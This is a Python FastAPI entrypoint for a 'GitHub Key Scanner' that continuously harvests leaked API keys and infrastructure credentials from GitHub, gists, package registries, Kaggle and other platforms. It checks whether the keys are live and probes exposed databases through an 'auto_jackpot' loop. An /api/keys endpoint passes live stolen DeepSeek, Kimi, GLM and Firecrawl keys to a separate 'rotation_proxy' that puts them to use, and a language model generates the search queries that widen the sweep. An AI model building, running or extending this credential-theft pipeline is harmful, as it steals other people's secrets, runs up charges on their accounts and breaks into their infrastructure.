"""
FastAPI entrypoint.

Background tasks (all concurrent, independent):
  _scan_loop()             — code-search scanner, N parallel workers per PAT
  trufflehog_loop()        — org/user sweep via trufflehog (if configured)
  tg_bot.bot_loop()        — Telegram interactive Key Vault (inline keyboard)
  _query_rotation_loop()   — combinatorial query gen every 8h
  _themer_loop()           — DeepSeek creative themer every 8h
  _vocab_expander_loop()   — DeepSeek vocab discovery every 24h
  _archetype_miner_loop()  — DeepSeek archetype mining every 24h
  _active_learner_loop()   — DeepSeek tactical query gen every 30 min
  _auto_jackpot_loop()     — infra-creds dump+probe every hour
  _cleanup_loop()          — daily DB hygiene
  _revalidation_loop()     — periodic key liveness re-check
  author_walk_loop()       — watched-author repo & gist & org-member walks
  Per-platform scanners (events/gists/issues/npm/pypi/codeberg/gitee/etc).
"""

import asyncio
import html
import logging
import os
from contextlib import asynccontextmanager
from datetime import datetime, timezone, timedelta

from fastapi import Body, FastAPI, Header, HTTPException, Query
from fastapi.responses import HTMLResponse

import db
from config import (SCAN_INTERVAL, GITHUB_TOKENS, MAX_PAGES,
                    INFRA_LOW_RISK_MAX_DAYS, DB_PATH, MIRROR_MODE)
from validators import VALIDATORS as EXTRACTORS_AVAILABLE  # actually validators dict
from scanner import run_cycle, _TOKEN_STATUS
from notifier import notify_found, notify_infra_found  # noqa: F401  (used by other modules' imports through this one)
from trufflehog_runner import trufflehog_loop
from gitee_scanner import gitee_loop
from events_scanner import events_loop
from gist_scanner import gists_loop
from kaggle_scanner import kaggle_loop
from hf_scanner import hf_loop
from codeberg_scanner import codeberg_loop
# postman_scanner dropped 2026-05-06: postman.com closed public profile
# scraping endpoints (/_api/profile, /api/profile, etc all return 404).
# 0 valid keys all-time; cannot be fixed without writing a new scraper
# against undocumented endpoints. Per-server probe of all known endpoints
# confirmed each returns 404. Dead branch.
from npm_scanner import npm_loop
from pypi_scanner import pypi_loop
# commoncrawl_scanner dropped 2026-05-06: Railway IP can't reach
# index.commoncrawl.org (AWS S3 endpoint blocks data center IPs).
# Could route via Evomi but WARC fetches are GBs of traffic — not
# worth the proxy bandwidth cost for unproven yield.
# from commoncrawl_scanner import cc_loop
from author_scanner import author_walk_loop, walk_one_author, run_author_cycle
from tg_bot import bot_loop
from issues_scanner import issues_loop
from query_generator import generate_batch as generate_combo_batch, auto_blacklist_dead
from query_themer import generate_themed_batch
from kaggle_themer import generate_kaggle_themed_batch
from replit_scanner import replit_loop
from vocab_expander import run_expansion_cycle
from archetype_miner import run_archetype_cycle

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s %(levelname)s %(name)s: %(message)s",
)
log = logging.getLogger(__name__)

# In-memory ring buffer of recent log records. Lets us grep recent logs via
# /admin/logs without needing Railway CLI access. Captures both INFO and
# WARNING so 429/timeouts/etc are visible.
from collections import deque as _deque
_LOG_BUFFER: _deque = _deque(maxlen=10000)


class _RingBufferHandler(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        try:
            _LOG_BUFFER.append({
                "ts":      datetime.fromtimestamp(record.created, tz=timezone.utc).isoformat(),
                "level":   record.levelname,
                "logger":  record.name,
                "message": record.getMessage()[:1000],
            })
        except Exception:
            pass


_ring_handler = _RingBufferHandler()
_ring_handler.setLevel(logging.INFO)
logging.getLogger().addHandler(_ring_handler)


async def _scan_loop():
    while True:
        try:
            await run_cycle()
        except Exception as e:
            log.error("cycle crashed: %s", e)
        log.info("sleeping %ds until next cycle", SCAN_INTERVAL)
        await asyncio.sleep(SCAN_INTERVAL)


async def _revalidation_loop():
    """
    Re-validate keys already in DB as is_valid=1 every 12 h.
    Catches quota expiry (Google free-tier resets daily but runs out quickly),
    depleted balances (DeepSeek/OpenAI), and revoked keys.
    Updates is_valid=0 + last_validated_at so the web UI and future reports
    reflect current reality, not the snapshot from when the key was first found.
    """
    from validators import validate as _validate
    while True:
        await asyncio.sleep(43200)  # 12 h
        try:
            rows = db.get_valid_keys_to_revalidate(max_age_hours=12)
            if not rows:
                continue
            n_dead = 0
            for row in rows:
                ok = await _validate(row["provider"], row["key_full"])
                db.update_key_validity(row["key_hash"], ok)
                if not ok:
                    n_dead += 1
            log.info("revalidation: %d/%d keys now dead, %d still alive",
                     n_dead, len(rows), len(rows) - n_dead)
        except Exception as e:
            log.error("revalidation loop err: %s", e)


async def _cleanup_loop():
    """Daily cleanup of old low-risk infra findings to keep DB size bounded."""
    while True:
        await asyncio.sleep(86400)  # once per day
        try:
            n = db.cleanup_old_low_risk(older_than_days=INFRA_LOW_RISK_MAX_DAYS)
            if n:
                log.info("cleanup: removed %d old low-risk infra findings (>%dd)",
                         n, INFRA_LOW_RISK_MAX_DAYS)
        except Exception as e:
            log.error("cleanup loop err: %s", e)


async def _query_rotation_loop():
    """
    Combinatorial query generator (Layer 1) — runs every 8h.

    Cheap deterministic Cartesian-product over PROVIDER_AXES + global axes
    (filenames × languages × time-windows × size-buckets). 15-day non-repeat
    enforced by db.get_recent_query_hashes pre-filter. Auto-blacklists
    queries with 5+ uses and zero yield (30d cooldown).
    """
    # Stagger initial run so we don't slam DB during boot — wait 5 min so
    # the scanner has time to warm caches and the first cycle is underway.
    await asyncio.sleep(300)
    while True:
        try:
            inserted = await asyncio.to_thread(generate_combo_batch)
            blacklisted = await asyncio.to_thread(auto_blacklist_dead)
            log.info("query_rotation: +%d combo queries | %d auto-blacklisted",
                     inserted, blacklisted)
        except Exception as e:
            log.error("query_rotation crashed: %s", e)
        await asyncio.sleep(8 * 3600)   # 8h


async def _themer_loop():
    """
    DeepSeek-driven creative query generator (Layer 3) — runs every 8h.

    Produces ~25 highly-targeted queries per batch using the model's
    knowledge of new model releases, geo-linguistic patterns, niche file
    types, and yield-feedback from prior batches. Uses valid DeepSeek keys
    from our own DB with auto-rotation on 401/402.

    Local probe verified: deepseek-v4-pro effort=max produces juice
    (multi-provider OR-combos, Chinese 密钥, .cursor/mcp.json, claude-opus-4
    model anchors). Each batch takes 4-7 min and ~$0.015.
    """
    # Stagger 4h offset from the combinatorial loop so they don't slam
    # the DB / network simultaneously.
    await asyncio.sleep(4 * 3600)
    while True:
        try:
            inserted = await generate_themed_batch()
            log.info("themer: +%d themed queries inserted", inserted)
        except Exception as e:
            log.error("themer crashed: %s", e)
        await asyncio.sleep(8 * 3600)   # 8h


async def _kaggle_themer_loop():
    """
    DeepSeek-driven Kaggle query generator — runs every 2h.

    Mirrors _themer_loop but for Kaggle search. Generates 30 fresh queries
    per batch using LLM knowledge of: notebook title patterns, niche
    providers (kling/ark/glm), course/hackathon signatures, new 2026
    model names, RAG/agent framework leaks. Yield-feedback driven —
    top-yielding queries from prior cycles fed back as positive examples.

    Stored in kaggle_dynamic_queries table; kaggle_scanner picks up the
    top-yielding rows every 10min (KAGGLE_SCAN_INTERVAL) alongside the
    114 static queries. Cumulative effect: query pool grows continuously.

    Cost: ~$0.015 per batch × 12/day = $5.40/mo. Acceptable for the
    adaptive coverage Kaggle gives us (25%+ conversion).
    """
    # Quick first run — 5 min after boot — so we don't wait 6+ hours for
    # the first batch of LLM-generated queries on a fresh deploy.
    await asyncio.sleep(5 * 60)
    while True:
        try:
            inserted = await generate_kaggle_themed_batch()
            log.info("kaggle_themer: +%d kaggle queries inserted", inserted)
        except Exception as e:
            log.error("kaggle_themer crashed: %s", e)
        await asyncio.sleep(2 * 3600)   # 2h


async def _auto_jackpot_loop():
    """Auto-jackpot probe — every 1h, picks up to 30 unprobed
    is_validated=1 rows and runs the full jackpot pipeline (Vault probe +
    table sample + AI-key extraction + validation + save_key + companion
    score + new risk_level). Closes the gap where freshly-found infra
    creds sat unprobed until someone manually triggered the endpoint.

    No TG digest from this loop (would be too noisy 24×/day). Use
    /admin/jackpot_status to inspect last result. Notify_found IS still
    fired per discovered live key inside infra (high-signal).
    """
    # Wait 30 min after boot — let initial scans + validations complete
    await asyncio.sleep(1800)
    from infra_jackpot import run_jackpot_cycle
    while True:
        try:
            unprobed = db.get_unprobed_validated_infra(limit=1)
            if unprobed:
                counters = await run_jackpot_cycle(limit=30, only_unprobed=True)
                log.info("auto_jackpot tick: %s", {
                    k: counters.get(k, 0) for k in (
                        "total", "probed", "with_validated_keys",
                        "saved_to_found_keys", "jackpot_critical",
                        "total_estimated_exposure_usd",
                    )
                })
            else:
                log.debug("auto_jackpot: no unprobed validated rows")
        except Exception as e:
            log.error("auto_jackpot loop err: %s", e)
        await asyncio.sleep(3600)   # 1h


async def _archetype_miner_loop():
    """Archetype miner — every 24h, pattern-mine top-yield repos and ask
    DeepSeek for similar-repo queries. Inserts into dynamic_queries with
    theme='archetype:NAME' so yield is tracked per archetype."""
    # Wait 6h after boot — give the scanner time to accumulate fresh
    # validated keys for the miner to learn from
    await asyncio.sleep(6 * 3600)
    while True:
        try:
            from notifier import _send
            result = await run_archetype_cycle()
            if "error" in result:
                log.warning("archetype_miner: %s", result)
            else:
                log.info("archetype_miner cycle: %s", {
                    k: result[k] for k in
                    ("archetype_count", "queries_proposed", "queries_inserted")
                })
                # Telegram digest
                try:
                    arch_lines = [
                        f"  • {a['name']} ({a['queries_proposed']} queries)"
                        for a in result.get("archetypes", [])[:6]
                    ]
                    msg = (
                        "🧬 <b>Archetype miner cycle done</b>\n"
                        f"Архетипов идентифицировано: {result['archetype_count']}\n"
                        f"Сгенерировано queries: {result['queries_proposed']}\n"
                        f"Добавлено в pool (после dedup): "
                        f"<b>{result['queries_inserted']}</b>\n\n"
                        + "Архетипы:\n" + "\n".join(arch_lines)
                    )
                    await _send(msg)
                except Exception as e:
                    log.error("archetype TG digest err: %s", e)
        except Exception as e:
            log.error("archetype_miner loop crashed: %s", e)
        await asyncio.sleep(24 * 3600)


async def _active_learner_loop():
    """
    Active-learning yield refinement — runs every 30 min.

    Reads last cycle's stats + last 100 finds, generates 5-10 tactical
    follow-up queries using DeepSeek-v4-pro (max thinking) with GLM-5.1
    fallback. Catches emerging patterns within 30 min vs themer's 8h delay
    — especially valuable for SS Partner pre-revoke 24h race window.
    """
    # Wait 5 min after boot so initial scan_cycle has stats to chew on
    await asyncio.sleep(300)
    while True:
        try:
            from active_learner import run_active_learning
            summary = await run_active_learning()
            if summary.get("inserted", 0) > 0:
                log.info("active_learner: %s", summary)
            else:
                log.debug("active_learner: %s", summary)
        except Exception as e:
            log.error("active_learner crashed: %s", e)
        await asyncio.sleep(1800)   # 30 min


async def _vocab_expander_loop():
    """
    AI vocabulary expander (Layer 2) — runs every 24h.

    For each provider with valid keys in DB, fetches up to 20 recent
    valid-key files, sends them to DeepSeek with a structured extraction
    prompt, and writes new env_names / filenames / context_words to
    axis_extensions. Picked up automatically by the next combinatorial
    generator cycle — no code changes needed when DeepSeek discovers a
    new naming convention in real leaked files.
    """
    # Wait 1h after boot so vocab discovery has fresh data to chew on
    # (initial scan should yield some valid keys by then).
    await asyncio.sleep(3600)
    while True:
        try:
            summary = await run_expansion_cycle()
            log.info("vocab_expander: %s", summary)
        except Exception as e:
            log.error("vocab_expander crashed: %s", e)
        await asyncio.sleep(24 * 3600)   # 24h


@asynccontextmanager
async def lifespan(app: FastAPI):
    db.init_db()

    if MIRROR_MODE:
        # Mirror service: scans GitHub from a different IP, ships finds to
        # master via mirror_relay. We KEEP additional GitHub-surface scanners
        # (events/issues) and PUBLIC-only scanners (npm/pypi/commoncrawl).
        # Their finds go through db.save_key() which automatically relays to
        # master via mirror_relay — same dedup, same Telegram digest path.
        #
        # Disabled: telegram bot, deepseek pipelines (run only on master where
        # the canonical DB lives), per-platform scanners that need their own
        # tokens (gitee/codeberg/hf/kaggle/postman/trufflehog) — saves env
        # complexity on mirror, master already covers them.
        #
        # Per /admin/source_breakdown audit (2026-05-06) + revision:
        #   gist scanner all-time: 0 valid keys → CUT from mirrors entirely.
        #     /gists/public is a global feed; if master saw 0 in a year,
        #     mirrors would see ~the same. Removing this freed enough core on
        #     m2 to unstick scan_loop (was: +0 files/20min → +552 files/min).
        #   issues scanner all-time: 22 valid (light core cost) → KEPT on
        #     mirrors. Mirror-side redundancy may double yield to ~40/year.
        #   events scanner all-time: 486 valid (63% of pool!) → KEPT on
        #     mirrors. /events is a global feed but the firehose moves fast;
        #     extra IPs catch race-window keys master may miss between polls.
        #     Polling cost is light (~1 call/min/token) and well-spent.
        # Earlier comment claimed events/gists/issues use "different rate-limit
        # pools" — that was wrong. All eat the same `core` quota. Gist content
        # fetches were the heavy part, not the polling itself.
        log.info("=== MIRROR_MODE active — scan + events + issues + kaggle + gitee + relay ===")
        from mirror_relay import flush_loop as _mirror_flush, query_sync_loop as _mirror_query_sync
        tasks = [
            asyncio.create_task(_scan_loop(),         name="scan_loop"),
            asyncio.create_task(_mirror_flush(),      name="mirror_relay_flush"),
            asyncio.create_task(_mirror_query_sync(), name="mirror_relay_query_sync"),
            # GitHub-surface scanners with provable yield (per source_breakdown)
            asyncio.create_task(events_loop(),        name="events_scanner"),
            asyncio.create_task(issues_loop(),        name="issues_scanner"),
            # Public registries — no auth, no rate-limit overlap with GitHub
            asyncio.create_task(npm_loop(),           name="npm_scanner"),
            asyncio.create_task(pypi_loop(),          name="pypi_scanner"),
            # Author-walk uses GITHUB_TOKENS but on a different surface
            asyncio.create_task(author_walk_loop(),   name="author_walk"),
            # Kaggle + Gitee — moved here from master because mirror Railway
            # IPs pass Cloudflare's data-center filter direct (master IP is
            # blocked → was paying Evomi proxy). Empirical: m1/m2 → 401
            # auth-challenge on Kaggle direct vs master 404. Same for Gitee.
            # Mirror saves with file_type='kaggle' / file_type='gitee' which
            # mirror_relay now ships to master verbatim (file_type preserved).
            asyncio.create_task(kaggle_loop(),        name="kaggle_scanner"),
            asyncio.create_task(gitee_loop(),         name="gitee_scanner"),
        ]
    else:
        tasks = [
            asyncio.create_task(_scan_loop(),           name="scan_loop"),
            asyncio.create_task(_cleanup_loop(),        name="db_cleanup"),
            asyncio.create_task(_revalidation_loop(),   name="revalidation"),
            asyncio.create_task(trufflehog_loop(),      name="trufflehog"),
            # kaggle + gitee MOVED to mirrors (their Railway IPs pass
            # Cloudflare DC filter direct; master IP is blocked → was
            # paying Evomi). See MIRROR_MODE branch above.
            asyncio.create_task(events_loop(),          name="events_scanner"),
            asyncio.create_task(gists_loop(),           name="gists_scanner"),
            asyncio.create_task(hf_loop(),              name="hf_scanner"),
            asyncio.create_task(codeberg_loop(),        name="codeberg_scanner"),
            # postman_loop dropped — see import-block comment
            asyncio.create_task(npm_loop(),             name="npm_scanner"),
            asyncio.create_task(pypi_loop(),            name="pypi_scanner"),
            # cc_loop dropped — Railway IP blocked, see commoncrawl_scanner import comment
            asyncio.create_task(author_walk_loop(),     name="author_walk"),
            asyncio.create_task(_query_rotation_loop(), name="query_rotation"),
            asyncio.create_task(_themer_loop(),         name="query_themer"),
            asyncio.create_task(_kaggle_themer_loop(),  name="kaggle_themer"),
            asyncio.create_task(replit_loop(),          name="replit_scanner"),
            asyncio.create_task(_vocab_expander_loop(), name="vocab_expander"),
            asyncio.create_task(_archetype_miner_loop(), name="archetype_miner"),
            asyncio.create_task(_active_learner_loop(),  name="active_learner"),
            asyncio.create_task(_auto_jackpot_loop(),   name="auto_jackpot"),
            asyncio.create_task(issues_loop(),          name="issues_scanner"),
            asyncio.create_task(bot_loop(),             name="tg_bot"),
        ]
    yield
    for t in tasks:
        t.cancel()


app = FastAPI(title="GitHub Key Scanner", lifespan=lifespan)

# Optional admin secret for mutating endpoints (/admin/vacuum).
# Set ADMIN_TOKEN on Railway; if not set, endpoint is open (acceptable for private deploys).
_ADMIN_TOKEN: str = os.environ.get("ADMIN_TOKEN", "")


def _check_admin(authorization: str | None):
    if not _ADMIN_TOKEN:
        return  # not configured — open access
    if authorization != f"Bearer {_ADMIN_TOKEN}":
        raise HTTPException(status_code=401, detail="Unauthorized")


# Separate token for hermes-bounty's rotation_proxy. Keeping it distinct from
# ADMIN_TOKEN means a leak of one doesn't grant the other, and lets us revoke
# the bounty bridge without locking the admin panel.
_ROTATION_TOKEN: str = os.environ.get("ROTATION_API_TOKEN", "")

# Only providers used by Hermes are exposed via /api/keys — even with a leaked
# token, an attacker can't enumerate every provider in the DB this way.
_ROTATION_ALLOWED_PROVIDERS = frozenset({"deepseek", "kimi", "glm", "firecrawl"})


def _check_rotation(authorization: str | None) -> None:
    if not _ROTATION_TOKEN:
        raise HTTPException(503, detail="ROTATION_API_TOKEN not configured")
    if authorization != f"Bearer {_ROTATION_TOKEN}":
        raise HTTPException(401, detail="Unauthorized")


# ── Web UI ─────────────────────────────────────────────────────────────────

@app.get("/", response_class=HTMLResponse)
async def root():
    stats = db.get_stats()
    rows  = db.get_results(valid_only=False, limit=100)

    by_prov_html = ""
    for row in stats.get("by_provider", []):
        by_prov_html += (
            f"<tr><td>{row['provider'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#4caf50'>{row['valid']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        badge    = "✅" if r["is_valid"] else "⚠️"
        repo_e   = html.escape(r["repo"])
        path_e   = html.escape(r["file_path"])
        prov_e   = html.escape(r["provider"])
        key_e    = html.escape(r["key_preview"])
        ftype_e  = html.escape(r["file_type"])
        rows_html += (
            f"<tr><td>{badge}</td>"
            f"<td>{prov_e}</td>"
            f"<td><code>{key_e}</code></td>"
            f"<td><a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{ftype_e}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    n_tokens = len(GITHUB_TOKENS)
    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Key Scanner</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{background:#1a1a1a}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
  .badge{{font-size:.8em;background:#1e3a5f;color:#58a6ff;padding:2px 6px;border-radius:4px}}
</style></head><body>
<h2>🔍 GitHub Key Scanner
  <span class='badge'>{n_tokens} token{"s" if n_tokens!=1 else ""} · {MAX_PAGES} pages/query</span>
</h2>
<p>
  <span class='stat'>Repos: <b>{stats['repos_scanned']}</b></span>
  <span class='stat'>Files: <b>{stats['files_scanned']}</b></span>
  <span class='stat'>Keys: <b>{stats['keys_found']}</b></span>
  <span class='stat'>Valid: <b style='color:#4caf50'>{stats['keys_valid']}</b></span>
</p>
<h3>By Provider</h3>
<table style='width:auto'>
  <thead><tr><th>Provider</th><th>Found</th><th>Valid</th></tr></thead>
  <tbody>{by_prov_html}</tbody>
</table>
<p><a href='/infra'>🏗️ Infrastructure Credentials →</a></p>
<h3>Recent 100 Keys</h3>
<table>
  <thead><tr><th>Status</th><th>Provider</th><th>Key</th>
  <th>Repo</th><th>Stars</th><th>Type</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
</body></html>"""


@app.get("/stats")
async def stats():
    return db.get_stats()


@app.get("/results")
async def results(valid_only: bool = Query(False), limit: int = Query(200)):
    return db.get_results(valid_only=valid_only, limit=limit)


@app.get("/infra", response_class=HTMLResponse)
async def infra_page(risk: str = Query(None), limit: int = Query(200)):
    istats = db.get_infra_stats()
    rows   = db.get_infra_results(risk_filter=risk, limit=limit)

    _RISK_COLOR = {"critical": "#ff00aa", "high": "#ff4444",
                   "medium": "#ffaa00", "low": "#888"}
    _RISK_BG    = {"critical": "#2a002a", "high": "#2a0000",
                   "medium": "#1a1200", "low": "#111"}

    by_type_html = ""
    for row in istats.get("by_type", []):
        by_type_html += (
            f"<tr><td>{row['cred_type'].upper()}</td>"
            f"<td>{row['total']}</td>"
            f"<td style='color:#ff4444'>{row['high_risk']}</td>"
            f"<td style='color:#ffaa00'>{row['med_risk']}</td></tr>"
        )

    by_dest_html = ""
    for row in istats.get("by_dest", [])[:10]:
        by_dest_html += (
            f"<tr><td><code>{row['destination']}</code></td>"
            f"<td>{row['cred_type']}</td>"
            f"<td>{row['cnt']}</td></tr>"
        )

    rows_html = ""
    for r in rows:
        rl       = r.get("risk_level", "low")
        col      = _RISK_COLOR.get(rl, "#888")
        bg       = _RISK_BG.get(rl, "#111")
        dest_raw = r.get("destination", "")
        dest     = f"<code>{html.escape(dest_raw)}</code>" if dest_raw else "—"
        v        = r.get("is_validated", -1)
        val_badge = ("✅" if v == 1 else "❌" if v == 0 else "⏳")
        jp_score  = r.get("jackpot_score", 0) or 0
        jp_color  = ("#ff00aa" if jp_score >= 80 else
                     "#ff4444" if jp_score >= 60 else
                     "#ffaa00" if jp_score >= 30 else "#666")
        jp_cell   = (f"<td style='color:{jp_color};font-weight:bold'>{jp_score}</td>"
                     if jp_score else "<td style='color:#444'>—</td>")
        route     = r.get("connect_route", "") or ""
        route_cell = f"<td><code>{html.escape(route)}</code></td>" if route else "<td>—</td>"
        repo_e    = html.escape(r["repo"])
        ctype_e   = html.escape(r["cred_type"].upper())
        prev_e    = html.escape(r["cred_preview"])
        file_path_e = html.escape(r.get("file_path", "") or "")
        file_url  = r.get("file_url", "") or ""
        repo_link = (f"<a href='{html.escape(file_url)}' target='_blank'>{repo_e}</a>"
                     if file_url else
                     f"<a href='https://github.com/{repo_e}' target='_blank'>{repo_e}</a>")
        rows_html += (
            f"<tr style='background:{bg}'>"
            f"<td style='color:{col};font-weight:bold'>{rl.upper()}</td>"
            f"{jp_cell}"
            f"<td>{val_badge}</td>"
            f"{route_cell}"
            f"<td>{ctype_e}</td>"
            f"<td><code>{prev_e}</code></td>"
            f"<td>{dest}</td>"
            f"<td>{repo_link}<br><small style='color:#888'>{file_path_e}</small></td>"
            f"<td>⭐{r['repo_stars']}</td>"
            f"<td>{r['discovered_at'][:16]}</td></tr>\n"
        )

    filter_links = (
        "<a href='/infra'>All</a> · "
        "<a href='/infra?risk=critical' style='color:#ff00aa'>Critical</a> · "
        "<a href='/infra?risk=high' style='color:#ff4444'>High</a> · "
        "<a href='/infra?risk=medium' style='color:#ffaa00'>Medium</a> · "
        "<a href='/infra?risk=low' style='color:#888'>Low</a>"
    )

    return f"""<!DOCTYPE html><html><head><meta charset='utf-8'>
<title>Infra Credentials</title>
<style>
  body{{font-family:monospace;background:#111;color:#eee;padding:20px}}
  table{{border-collapse:collapse;width:100%;margin-bottom:20px}}
  th,td{{border:1px solid #333;padding:6px 10px;text-align:left}}
  th{{background:#222}}tr:hover{{filter:brightness(1.2)}}
  a{{color:#58a6ff}}code{{background:#222;padding:2px 5px;border-radius:3px}}
  .stat{{display:inline-block;margin:0 16px 8px 0;font-size:1.1em}}
  h3{{color:#aaa;margin-top:28px;border-bottom:1px solid #333;padding-bottom:6px}}
</style></head><body>
<h2>🏗️ Infrastructure Credentials</h2>
<p>
  <span class='stat'>Total: <b>{istats['total']}</b></span>
  <span class='stat' style='color:#ff4444'>High risk: <b>{istats['high']}</b></span>
  <span class='stat' style='color:#ffaa00'>Medium: <b>{istats['medium']}</b></span>
</p>
<p>{filter_links}</p>
<h3>By Type</h3>
<table style='width:auto'>
  <thead><tr><th>Type</th><th>Total</th><th>High</th><th>Medium</th></tr></thead>
  <tbody>{by_type_html}</tbody>
</table>
{"<h3>Top Destinations</h3><table style='width:auto'><thead><tr><th>Host</th><th>Type</th><th>Count</th></tr></thead><tbody>" + by_dest_html + "</tbody></table>" if by_dest_html else ""}
<h3>Findings ({risk or "all"}, sorted by jackpot_score, limit {limit})</h3>
<table>
  <thead><tr><th>Risk</th><th>Jackpot</th><th>Valid</th><th>Route</th>
  <th>Type</th><th>Preview</th><th>Destination</th>
  <th>Repo / file_path</th><th>Stars</th><th>Found at</th></tr></thead>
  <tbody>{rows_html}</tbody>
</table>
<p><a href='/'>← AI Keys</a> · <a href='/infra/jackpot' style='color:#ff00aa'>Top jackpots →</a></p>
</body></html>"""


@app.get("/infra/stats")
async def infra_stats():
    return db.get_infra_stats()


@app.get("/infra/jackpot")
async def infra_jackpot_targets(
    min_score: int = Query(60, ge=0, le=100),
    limit: int = Query(200, ge=1, le=2000),
    authorization: str | None = Header(default=None),
):
    """JSON dump of disclosure-ready targets, sorted by jackpot_score DESC.

    Returns only rows with jackpot_score >= min_score (default 60). Each row
    has every field the operator needs to write a manual disclosure email:
      • cred_type, cred_full (raw — for verification on operator's side)
      • repo, file_path, file_url
      • destination, risk_level, is_validated, connect_route
      • jackpot_score, jackpot_data (parsed JSON with previews,
        suspicious_tables, ai_keys_validated, estimated_exposure_usd)
    """
    _check_admin(authorization)
    import sqlite3, json as _json
    with sqlite3.connect(DB_PATH) as c:
        c.row_factory = sqlite3.Row
        rows = c.execute(
            """SELECT cred_type, cred_full, cred_preview, repo, file_path, file_url,
                      destination, risk_level, is_validated, connect_route,
                      jackpot_score, jackpot_data, repo_stars, repo_created,
                      discovered_at
               FROM infra_findings
               WHERE jackpot_score >= ?
               ORDER BY jackpot_score DESC, discovered_at DESC
               LIMIT ?""",
            (min_score, limit),
        ).fetchall()
    out = []
    for r in rows:
        d = dict(r)
        jd = d.get("jackpot_data")
        if jd:
            try:
                d["jackpot_data"] = _json.loads(jd)
            except Exception:
                pass
        out.append(d)
    return {"min_score": min_score, "count": len(out), "items": out}


@app.get("/check-tokens")
async def check_tokens():
    """Live-check all configured tokens across all platforms. All requests run in parallel."""
    import httpx as _httpx
    from config import (GITHUB_TOKENS, GITEE_TOKENS, CODEBERG_TOKENS,
                        HF_TOKEN, KAGGLE_TOKENS, POSTMAN_TOKENS)

    async def _check(c, label, url, headers=None, params=None):
        try:
            r = await c.get(url, headers=headers or {}, params=params or {})
            if r.status_code == 200:
                try:
                    d = r.json()
                except Exception:
                    d = {}
                return {"token": label, "status": "ok", "data": d}
            return {"token": label, "status": f"dead ({r.status_code})", "body": r.text[:150]}
        except Exception as e:
            return {"token": label, "status": f"error: {type(e).__name__}: {str(e)[:100]}"}

    async with _httpx.AsyncClient(timeout=10, follow_redirects=True) as c:
        tasks = {}

        for tok in GITHUB_TOKENS:
            tasks[f"gh:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://api.github.com/user",
                headers={"Authorization": f"token {tok}", "User-Agent": "ghscan/1.0"})

        for tok in CODEBERG_TOKENS:
            tasks[f"cb:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://codeberg.org/api/v1/user",
                headers={"Authorization": f"token {tok}", "User-Agent": "Mozilla/5.0"})

        for tok in GITEE_TOKENS:
            tasks[f"gt:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://gitee.com/api/v5/user", params={"access_token": tok})

        if HF_TOKEN:
            tasks["hf"] = _check(c, HF_TOKEN[:12] + "...",
                "https://huggingface.co/api/whoami-v2",
                headers={"Authorization": f"Bearer {HF_TOKEN}"})

        for tok in KAGGLE_TOKENS:
            tasks[f"kg:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://www.kaggle.com/api/v1/kernels/list",
                headers={"Authorization": f"Bearer {tok}"},
                params={"pageSize": 1, "sortBy": "hotness", "language": "python"})

        for tok in POSTMAN_TOKENS:
            tasks[f"pm:{tok[:12]}"] = _check(c, tok[:12] + "...",
                "https://api.postman.com/me",
                headers={"X-Api-Key": tok})

        raw = await asyncio.gather(*tasks.values())
        tagged = dict(zip(tasks.keys(), raw))

    def _group(prefix):
        return [v for k, v in tagged.items() if k.startswith(prefix)]

    return {
        "github":      _group("gh:"),
        "codeberg":    _group("cb:"),
        "gitee":       _group("gt:"),
        "huggingface": tagged.get("hf", "not configured"),
        "kaggle":      _group("kg:"),
        "postman":     _group("pm:"),
    }


@app.get("/health")
async def health():
    alive   = sum(1 for s in _TOKEN_STATUS.values() if s.get("alive", True))
    total_t = len(GITHUB_TOKENS)
    db_mb   = round(os.path.getsize(DB_PATH) / 1024 / 1024, 2) if os.path.exists(DB_PATH) else 0
    return {
        "ok":     alive > 0,
        "tokens": {
            "total": total_t,
            "alive": alive if _TOKEN_STATUS else "unchecked",
            "dead":  total_t - alive if _TOKEN_STATUS else 0,
            "status": {
                k: {
                    "alive":              v.get("alive"),
                    "search_remaining":   v.get("remaining"),
                    "search_limit":       v.get("limit"),
                    "core_remaining":     v.get("core_remaining"),
                    "core_limit":         v.get("core_limit"),
                    "core_blocked_until": v.get("core_blocked_until", 0),
                }
                for k, v in _TOKEN_STATUS.items()
            },
        },
        "db_mb":        db_mb,
        "files_scanned": db.get_stats().get("files_scanned", 0),
        "mirror":       _mirror_queue_stats(),
    }


def _mirror_queue_stats() -> dict | None:
    """If we're a mirror service, expose unsynced relay queue depth so
    diagnostics show whether finds are being shipped to master."""
    try:
        from mirror_relay import queue_stats
        s = queue_stats()
        return s if s.get("active") else None
    except Exception:
        return None


# ── Rotation API for hermes-bounty rotation_proxy ─────────────────────────
# Allows the bounty project's rotation_proxy to pull live valid keys for
# Hermes-supported providers and report dead keys back. Endpoints are
# whitelisted to {deepseek, kimi, glm} so this token can't be used to dump
# every provider's keys.

@app.get("/api/keys")
async def api_keys_list(
    provider: str = Query(..., description="One of: deepseek, kimi, glm, firecrawl"),
    authorization: str | None = Header(default=None),
):
    _check_rotation(authorization)
    if provider not in _ROTATION_ALLOWED_PROVIDERS:
        raise HTTPException(400, detail=f"provider must be one of {sorted(_ROTATION_ALLOWED_PROVIDERS)}")
    rows = db.get_valid_keys_by_provider(provider)
    return [{"hash": r["key_hash"], "key": r["key_full"]} for r in rows]


@app.post("/api/keys/dead")
async def api_keys_dead(
    payload: dict = Body(...),
    authorization: str | None = Header(default=None),
):
